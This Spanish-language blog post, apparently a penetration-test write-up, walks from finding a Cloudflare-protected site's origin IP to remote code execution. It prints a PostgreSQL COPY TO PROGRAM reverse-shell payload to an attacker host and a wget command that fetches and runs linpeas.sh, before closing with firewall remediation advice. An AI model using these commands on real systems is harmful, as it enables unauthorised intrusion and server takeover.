---
title: 'Auditoría Web Real: De una fuga de IP al control total'
description: 'Caso práctico: Cómo un fallo en la configuración de Cloudflare permitió acceder a la base de datos y ejecutar código en el servidor.'
pubDate: '2026-01-06'
categories: ['Red Team']
tags: ['Web Exploitation', 'Pentesting', 'Red Team']
slug: "auditoria-web-real-caso-practico"
---

Recientemente realicé una auditoría que demuestra por qué ocultar la IP de origen es un paso crítico. Lo que comenzó como una simple mala configuración en el WAF (cortafuegos de aplicaciones web) terminó en un compromiso total de la infraestructura que envuelve la página.

En este post, publico la resolución que seguí para pasar de un simple escaneo de puertos a una Ejecución Remota de Código (RCE).

## 1. Fase de Reconocimiento (Recon)

Como es habitual, todo comienza mapeando la superficie de ataque. Mi metodología siempre divide el escaneo en dos pasos para ser eficiente: primero rapidez, luego busco los detalles (método algo más lento).

### Detección de Puertos (Fast Scan)
Lancé un escaneo agresivo (ruidoso) buscando únicamente puertos abiertos, ignorando la resolución DNS y el ping para ir más rápido.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn target.web
```

```text
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```

### Enumeración de Servicios
Sabiendo que el 80 y 443 están vivos, necesitaba saber qué servicios corrían detrás. Aquí es donde entra este segundo comando:

Usé las flags `-sC` (scripts por defecto) y `-sV` (versión de servicios) para "preguntar" a esos puertos específicos.

```bash
sudo nmap -sC -sV -p80,443 target.web
```

La salida de este comando me reveló la cuestión de porqué este post existe:

```text
PORT    STATE SERVICE   VERSION
80/tcp  open  http      Cloudflare http proxy
|_http-server-header: cloudflare
443/tcp open  ssl/https cloudflare
| ssl-cert: Subject: commonName=target.web
| Issuer: commonName=Cloudflare Inc ECC CA-3
|_http-server-header: cloudflare
```

### Análisis del Resultado
Al ver `http-server-header: cloudflare` y el emisor del certificado `Cloudflare Inc`, confirmé que **no estoy viendo el servidor real**.

Hay una capa intermedia WAF que filtra todo mi tráfico. Si lanzo un ataque ahora, Cloudflare lo detendrá. Sabiendo esto, el objetivo cambia inmediatamente a necesitar encontrar la IP de Origen para "bypassear" esta barrera y hablar directamente con el backend.

### El fallo: IP Leakage
Analicé las cabeceras del servidor buscando comportamientos únicos.

```bash
whatweb target.web
```

```text
[http://target.web](http://target.web) [301 Moved Permanently] Country[US], IP[172.67.X.X], HTTPServer[cloudflare], Title[301 Moved Permanently]
```

El servidor backend estaba mal configurado y devolvía una redirección específica. Busqué en **Shodan** esa misma huella para encontrar quién más respondía así en internet (la IP real, no la del proxy de cloudflare).

```bash
shodan search 'hostname:"target.web"'
```

```text
1 Result found:
X.X.X.X (Amazon AWS)
    HTTP/1.1 301 Moved Permanently
    Location: [https://target.web/](https://target.web/)
```

La IP `X.X.X.X` responde exactamente igual. Es el servidor real (Original).

## 2. Explotación: Acceso a Servicios Internos

Con la IP real, repetí el escaneo saltándome la protección de Cloudflare.

```bash
sudo nmap -sC -sV -p- -Pn X.X.X.X
```

```text
PORT     STATE SERVICE    VERSION
80/tcp   open  http       nginx
443/tcp  open  ssl/http   nginx
5432/tcp open  postgresql PostgreSQL DB 9.6.0-12
```

El puerto **5432** estaba expuesto. Probé credenciales por defecto (`postgres:postgres`) directamente contra la IP.

```bash
psql -h X.X.X.X -p 5432 -U postgres -d target_db
```

```text
psql (14.5, server 9.6.0)
Type "help" for help.

postgres=# 
```

**Acceso exitoso**. El servicio aceptaba conexiones externas sin firewall, al contrario de lo que pasaba antes.

## 3. Remote Code Execution (RCE)

Teniendo acceso de superusuario en la base de datos, utilicé `COPY TO PROGRAM` para ejecutar comandos en el sistema operativo subyacente y obtener una Reverse Shell.

**Terminal 1 (Atacante):**
Preparo el listener.
```bash
nc -lvnp 4444
```

**Terminal 2 (Inyección SQL):**
Ejecuto el payload malicioso.
```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/MI_IP/4444 0>&1"';
```

Al ejecutar la query, recibí la conexión en mi terminal:

```text
connect to [10.10.14.5] from (UNKNOWN) [X.X.X.X] 48202
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
postgres@target-server:/var/lib/postgresql$ whoami
postgres
postgres@target-server:/var/lib/postgresql$ id
uid=105(postgres) gid=113(postgres) groups=113(postgres),111(ssl-cert)
```

## 4. Post-Explotación y Conclusión

Ya dentro del servidor, subí **LinPEAS** para buscar escalada de privilegios.

```bash
wget http://MI_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

El reporte confirmó vectores vulnerables en el Kernel y permisos SUID.

### Remediación
Para evitar que ocurra esto en nuestra página web podemos configurar `iptables` o Security Groups para aceptar tráfico al puerto 80/443 solo desde las IPs de Cloudflare. Y que los servicios críticos (como bases de datos) deben escuchar en `127.0.0.1`, nunca en `0.0.0.0`.